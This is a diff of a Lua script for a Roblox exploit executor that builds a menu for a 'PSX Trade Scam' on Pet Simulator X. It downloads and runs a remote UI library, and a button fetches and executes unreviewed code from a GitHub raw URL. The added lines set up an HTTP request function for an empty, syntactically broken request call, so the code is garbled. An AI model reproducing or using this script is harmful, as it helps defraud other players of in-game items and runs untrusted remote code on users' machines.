@@ -1,8 +1,13 @@
 local gui = loadstring(game:HttpGet("https://gitlab.com/0x45.xyz/droplib/-/raw/master/drop-minified.lua"))():Init(config,game.CoreGui)
 
 
-local lpg = gui:CreateCategory("PSX - TRADE SCAM - Free")
+local lpg = gui:CreateCategory("PSX TRADE SCAM")
 
-lpg:CreateButton("Trade Scam ON/OFF"),function() loadstring(game:HttpGet("https://raw.githubusercontent.com/bltryrt/chingchong/main/12"))() end)
+lpg:CreateButton("PSX Trade Scam ON/OFF",function() loadstring(game:HttpGet("https://raw.githubusercontent.com/bltryrt/chingchong/main/12"))() end)
+
+local req = (syn and syn.request) or (http and http.request) or http_request or request
+
+req(
+   {
            })
    })
